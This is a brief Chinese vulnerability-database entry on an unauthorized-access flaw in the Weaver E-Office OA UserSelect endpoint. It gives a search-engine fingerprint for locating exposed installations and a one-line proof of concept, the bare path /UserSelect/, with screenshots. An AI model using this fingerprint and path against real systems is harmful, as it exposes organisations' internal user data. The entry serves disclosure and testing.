# 泛微OA E-Office UserSelect 未授权访问漏洞

## 漏洞描述

泛微OA E-Office UserSelect接口存在未授权访问漏洞，通过漏洞攻击者可以获取敏感信息

## 漏洞影响

<a-checkbox checked>泛微OA E-Office </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="泛微-EOffice"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1629190834596-c2c639a7-1fb7-4934-95ad-1d571629e383-20220313185718998.png)

验证POC

```bash
/UserSelect/
```

![img](../../../.vuepress/public/img/1629190950627-7732ab4d-cb88-4b60-adf1-75df5ceb2710.png)